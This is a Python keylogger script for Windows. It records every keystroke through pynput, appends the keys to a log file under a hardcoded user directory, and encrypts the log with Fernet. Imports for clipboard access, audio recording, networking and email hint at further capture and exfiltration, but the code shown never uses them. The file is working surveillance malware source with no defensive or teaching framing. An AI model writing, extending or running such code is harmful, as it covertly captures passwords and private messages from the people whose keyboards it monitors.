# THIS FILE GENS A KEY_LOG.TXT FILE ONLY and appends details to it

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
# EMAIL IMPORTS BELOW

import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

# EMAIL IMPORTS

############################KEY LOGGER BELOW



keys_information = 'key_log.txt'




file_path = "C:\\Users\\Raymond\\PycharmProjects\\keylog"
extend = "\\"
file_merge = file_path + extend

#keylogger below #keylogger below

count = 0
keys = []


def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    # we are going to increase the key count by 1
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    # we are going to be appending the press.txt file
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            # we are removing the '' when the keys are taken in
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

    # we are going to get the key to enc
    with open('encryption_key.txt','rb') as key:
        key = key.read()
    # we have gotten the key

    f = Fernet(key)

    # we are going to enc the file
    with open(keys_information, 'rb') as info:
        attained = info.read()

    encData = f.encrypt(attained)

    with open('e_keys.txt','wb')as encFile:
        encFile.write(encData)




def on_release(key):
    if key == Key.esc:
        return False
    # below we are stopping the keylogger
    # if currentTime > stoppingTime:
    #     return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


